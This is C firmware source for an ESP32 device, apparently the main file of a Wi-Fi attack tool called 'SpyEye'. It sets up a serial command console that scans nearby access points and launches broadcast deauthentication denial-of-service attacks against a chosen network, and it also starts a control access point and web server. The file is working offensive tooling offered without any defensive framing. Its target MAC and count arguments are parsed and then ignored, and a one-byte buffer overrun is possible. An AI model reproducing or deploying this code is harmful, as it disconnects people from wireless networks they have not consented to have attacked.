#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "driver/uart.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_system.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "webserver.h"
#include <stdlib.h>
#include "attack_dos.h" 

#define UART_PORT UART_NUM_0
#define BUF_SIZE (1024)
#define RD_BUF_SIZE (BUF_SIZE)


static void serial_command_task(void *arg);

static const char* TAG = "main";


static void uart_init()
{
    const uart_config_t uart_config = {
        .baud_rate = 115200, 
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_APB,
    };
    
    uart_driver_install(UART_PORT, BUF_SIZE * 2, BUF_SIZE * 2, 0, NULL, 0);
    uart_param_config(UART_PORT, &uart_config);
    
    uart_set_pin(UART_PORT, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
}

void app_main(void)
{
    ESP_LOGD(TAG, "app_main started");
    uart_init();
    xTaskCreate(serial_command_task, "serial_cmd_task", 4096, NULL, 10, NULL);
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifictl_mgmt_ap_start();
    attack_init();
    webserver_run();
}


int parse_mac_address(const char *mac_str, uint8_t *target_array) {
    if (mac_str == NULL || target_array == NULL) {
        return 0; //
    }


    int result = sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &target_array[0], &target_array[1], &target_array[2],
                       &target_array[3], &target_array[4], &target_array[5]);

    
    if (result == 6) {
        return 1; 
    } else {
        return 0;
    }
}



static void serial_command_task(void *arg)
{
    char *data = (char *) malloc(RD_BUF_SIZE);
    if (data == NULL) {
        ESP_LOGE(TAG, "Failed to allocate memory for serial data");
        vTaskDelete(NULL);
        return;
    }
    

    printf("\n--- SpyEye ESP32 Control Ready ---\n");
    printf("Enter 'STATUS', 'SCAN', or 'DEAUTH <target_mac> <ap_mac> <count>'\n");
    printf("----------------------------------\n");

    while (1) {

        int len = uart_read_bytes(UART_PORT, (uint8_t *)data, RD_BUF_SIZE, 20 / portTICK_PERIOD_MS);
        
        if (len > 0) {
            data[len] = '\0'; 
            

            char *command = data;
            while (*command == ' ' || *command == '\n' || *command == '\r') {
                command++;
            }
            char *end = command + strlen(command) - 1;
            while (end > command && (*end == ' ' || *end == '\n' || *end == '\r')) {
                *end = '\0';
                end--;
            }

            ESP_LOGI(TAG, "Received command: %s", command);

            if (strcmp(command, "STATUS") == 0) {
                printf("STATUS: OK\n");
                printf("ATTACK_STATE: %d\n", attack_get_status()->state);
                printf("----------------------------------\n");
            } 
            else if (strcmp(command, "SCAN") == 0) {
                printf("SCAN: Starting Wi-Fi scan...\n");
                wifictl_scan_nearby_aps();
                const wifictl_ap_records_t *ap_records = wifictl_get_ap_records();
                
                printf("SCAN_RESULTS_START\n");
                printf("BSSID,SSID,CHANNEL,RSSI,AUTH\n");
                for (int i = 0; i < ap_records->count; i++) {
                    const wifi_ap_record_t *ap = &ap_records->records[i];
                    printf("%02X:%02X:%02X:%02X:%02X:%02X,%s,%d,%d,%d\n",
                           ap->bssid[0], ap->bssid[1], ap->bssid[2], ap->bssid[3], ap->bssid[4], ap->bssid[5],
                           ap->ssid, ap->primary, ap->rssi, ap->authmode);
                }
                printf("SCAN_RESULTS_END\n");
                printf("----------------------------------\n");
            } 
            else if (strncmp(command, "DEAUTH", 6) == 0) {
                
                char *token = strtok(command, " "); 
                char *target_mac_str = strtok(NULL, " ");
                char *ap_mac_str = strtok(NULL, " "); 
                char *count_str = strtok(NULL, " "); 

                
                

                if (target_mac_str && ap_mac_str && count_str) {
                    
                   
                    uint8_t ap_mac_bytes[6]; // BSSID
                    if (parse_mac_address(ap_mac_str, ap_mac_bytes) == 0) {
                        printf("ERROR: Invalid AP MAC (BSSID) format. Use XX:XX:...\n");
                        printf("----------------------------------\n");
                        continue;
                    }
                    
                    
                    const wifictl_ap_records_t *ap_records = wifictl_get_ap_records();
                    const wifi_ap_record_t *target_ap = NULL; 

                    if (ap_records == NULL || ap_records->count == 0) {
                        printf("ERROR: No APs found. Please run 'SCAN' first.\n");
                        printf("----------------------------------\n");
                        continue;
                    }

                   
                    for (int i = 0; i < ap_records->count; i++) {
                        
                        if (memcmp(ap_records->records[i].bssid, ap_mac_bytes, 6) == 0) {
                            target_ap = &ap_records->records[i]; 
                            break; 
                        }
                    }

                 
                    if (target_ap == NULL) {
                        printf("ERROR: AP BSSID not found in scan results. Run 'SCAN' again.\n");
                        printf("----------------------------------\n");
                        continue;
                    }

                   
                    attack_config_t config;
                    memset(&config, 0, sizeof(attack_config_t)); 
                    
                 
                    config.method = ATTACK_DOS_METHOD_BROADCAST; 
                    config.ap_record = target_ap;

                    
                    attack_dos_start(&config);
                    attack_update_status(RUNNING);
                    
                    printf("DEAUTH: Broadcast Attack initiated on %s (Channel: %d)\n", target_ap->ssid, target_ap->primary);
                    printf("----------------------------------\n");

                } else {
                    printf("ERROR: DEAUTH command requires 3 arguments: <target_mac> <ap_mac> <count>\n");
                    printf("----------------------------------\n");
                }
            }
            else {
                printf("ERROR: Unknown command: %s\n", command);
                printf("----------------------------------\n");
            }
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
    free(data);
    vTaskDelete(NULL);
}
